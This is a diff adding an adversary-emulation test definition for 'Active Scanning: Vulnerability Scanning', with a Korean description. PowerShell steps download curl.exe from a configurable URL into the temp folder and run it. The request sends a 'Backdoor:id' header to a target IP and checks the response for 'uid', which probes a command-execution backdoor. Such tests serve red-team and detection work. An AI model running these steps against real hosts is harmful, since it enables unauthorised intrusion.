@@ -1,0 +1,74 @@
+attack_technique: T1595.002
+display_name: 'Active Scanning: Vulnerability Scanning'
+category:
+    - Reconnaissance
+progress: Complete
+atomic_tests:
+    - name: 'Active Scanning: Vulnerability Scanning'
+      description: |
+        English : Web Vulnerability Scan
+
+        Korean : 
+        웹 취약점이 존재하는지 스캔하는 기법 
+
+         - Execute : curl을 사용해 스캔
+         - Pre : 필요 없음
+         - Input : target IP, curl 다운로드 url
+         - dependencies: curl 
+         - Output : 스캔 결과
+         - Post : 스캔 결과 확인
+          
+      supported_platforms:
+        - windows
+      pre:
+        prepare_executor_name: ""
+        command: ""
+      input_arguments: 
+        target_ip:
+            description: IP for Target
+            type: Ip
+            default: http://192.168.103.18
+        curldownloadurl:
+            description: curl file url
+            type: Url
+            default: 'http://127.0.0.1:8080/T1595.002/curl.exe'
+      dependency_executor_name: powershell
+      dependencies:
+          prereq_command: |
+            if(ls $env:temp\T1595.002\curl.exe) { exit 0 } else { exit 1 }
+          get_prereq_command: |
+            New-Item -ItemType Directory "$env:temp/T1595.002" -Force | Out-Null
+            $WebRequest=New-Object System.Net.WebClient
+            $WebRequest.UseDefaultCredentials=$true
+            #$WebRequest.Credentials=(Get-Credential)
+            $Data=$WebRequest.DownloadData("#{curldownloadurl}")
+            [System.IO.File]::WriteAllBytes("$env:temp\T1595.002\curl.exe",$Data)
+      executor:
+        name: powershell
+        command: |
+            .$env:temp\T1595.002\curl.exe #{target_ip}/ -H "Backdoor:id"
+      output:
+        output_executor_name: powershell
+        command: |
+            .$env:temp\T1595.002\curl.exe  #{target_ip}/ -H "Backdoor:id"
+      post:
+        post_executor_name: powershell
+        command: |
+            $result = (.$env:temp\T1595.002\curl.exe  #{target_ip}/ -H "Backdoor:id")
+            if (echo $result | findstr "uid") { exit 0 } else { exit 1 }
+      technique_remote: True
+      source:
+        pre_state: 
+          - Compromised : True
+          - OS_type : Windows
+          - OS_status : Running
+          - Web_s : Not Unavailable
+      dest:
+        pre_state:
+          - Compromised : False
+          - Reachable : True
+          - Discovered : True
+          - Web : True
+          - Web_s : Running
+        post_state:
+          - Web_v : CVE-1
